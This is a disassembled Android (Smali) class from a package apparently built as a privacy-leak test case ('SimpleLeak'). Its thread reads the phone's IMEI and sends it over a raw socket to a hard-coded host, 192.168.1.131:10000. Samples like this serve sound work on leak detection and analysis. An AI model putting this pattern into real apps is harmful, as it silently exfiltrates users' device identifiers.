.class Ledu/fandm/enovak/leaks/SimpleLeak$1;
.super Ljava/lang/Thread;
.source "SimpleLeak.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Ledu/fandm/enovak/leaks/SimpleLeak;->IMEI_LEAK(Landroid/view/View;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Ledu/fandm/enovak/leaks/SimpleLeak;


# direct methods
.method constructor <init>(Ledu/fandm/enovak/leaks/SimpleLeak;)V
    .locals 0
    .param p1, "this$0"    # Ledu/fandm/enovak/leaks/SimpleLeak;

    .line 67
    iput-object p1, p0, Ledu/fandm/enovak/leaks/SimpleLeak$1;->this$0:Ledu/fandm/enovak/leaks/SimpleLeak;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 11

    .line 71
    :try_start_0
    iget-object v0, p0, Ledu/fandm/enovak/leaks/SimpleLeak$1;->this$0:Ledu/fandm/enovak/leaks/SimpleLeak;

    invoke-virtual {v0}, Ledu/fandm/enovak/leaks/SimpleLeak;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 72
    .local v0, "ctx":Landroid/content/Context;
    iget-object v1, p0, Ledu/fandm/enovak/leaks/SimpleLeak$1;->this$0:Ledu/fandm/enovak/leaks/SimpleLeak;

    const-string v2, "phone"

    invoke-virtual {v1, v2}, Ledu/fandm/enovak/leaks/SimpleLeak;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/telephony/TelephonyManager;

    .line 74
    .local v1, "telephonyManager":Landroid/telephony/TelephonyManager;
    const-string v2, "android.permission.READ_PHONE_STATE"

    invoke-static {v0, v2}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2

    const/4 v3, 0x0

    if-eqz v2, :cond_0

    .line 75
    const-string v2, "Phone state permissions required!"

    invoke-static {v0, v2, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v2

    invoke-virtual {v2}, Landroid/widget/Toast;->show()V

    goto :goto_0

    .line 79
    :cond_0
    invoke-virtual {v1}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v2

    .line 81
    .local v2, "IMEI":Ljava/lang/String;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "user1"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 85
    .local v4, "IMEIAndMore":Ljava/lang/String;
    new-instance v5, Ljava/net/Socket;

    const-string v6, "192.168.1.131"

    const/16 v7, 0x2710

    invoke-direct {v5, v6, v7}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    .line 86
    .local v5, "s":Ljava/net/Socket;
    new-instance v6, Ljava/io/OutputStreamWriter;

    invoke-virtual {v5}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 87
    .local v6, "out":Ljava/io/OutputStreamWriter;
    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v7

    invoke-virtual {v6, v2, v3, v7}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;II)V

    .line 88
    invoke-virtual {v6}, Ljava/io/OutputStreamWriter;->flush()V

    .line 91
    invoke-virtual {v6}, Ljava/io/OutputStreamWriter;->close()V

    .line 92
    invoke-virtual {v5}, Ljava/net/Socket;->close()V

    .line 94
    iget-object v7, p0, Ledu/fandm/enovak/leaks/SimpleLeak$1;->this$0:Ledu/fandm/enovak/leaks/SimpleLeak;

    iget v7, v7, Ledu/fandm/enovak/leaks/SimpleLeak;->blah:I

    add-int/lit8 v7, v7, 0x1

    .line 95
    .local v7, "a":I
    iget-object v8, p0, Ledu/fandm/enovak/leaks/SimpleLeak$1;->this$0:Ledu/fandm/enovak/leaks/SimpleLeak;

    const/4 v9, 0x3

    iput v9, v8, Ledu/fandm/enovak/leaks/SimpleLeak;->blah:I

    .line 98
    iget-object v8, p0, Ledu/fandm/enovak/leaks/SimpleLeak$1;->this$0:Ledu/fandm/enovak/leaks/SimpleLeak;

    iget v8, v8, Ledu/fandm/enovak/leaks/SimpleLeak;->blah:I

    if-eqz v8, :cond_1

    .line 99
    sget-object v8, Ledu/fandm/enovak/leaks/SimpleLeak;->TAG:Ljava/lang/String;

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, ""

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    iget-object v10, p0, Ledu/fandm/enovak/leaks/SimpleLeak$1;->this$0:Ledu/fandm/enovak/leaks/SimpleLeak;

    invoke-static {v10, v3}, Ledu/fandm/enovak/leaks/SimpleLeak;->access$000(Ledu/fandm/enovak/leaks/SimpleLeak;I)I

    move-result v3

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v8, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 106
    .end local v0    # "ctx":Landroid/content/Context;
    .end local v1    # "telephonyManager":Landroid/telephony/TelephonyManager;
    .end local v2    # "IMEI":Ljava/lang/String;
    .end local v4    # "IMEIAndMore":Ljava/lang/String;
    .end local v5    # "s":Ljava/net/Socket;
    .end local v6    # "out":Ljava/io/OutputStreamWriter;
    .end local v7    # "a":I
    :cond_1
    :goto_0
    goto :goto_1

    .line 103
    :catch_0
    move-exception v0

    .line 104
    .local v0, "ioe":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 107
    .end local v0    # "ioe":Ljava/io/IOException;
    :goto_1
    return-void
.end method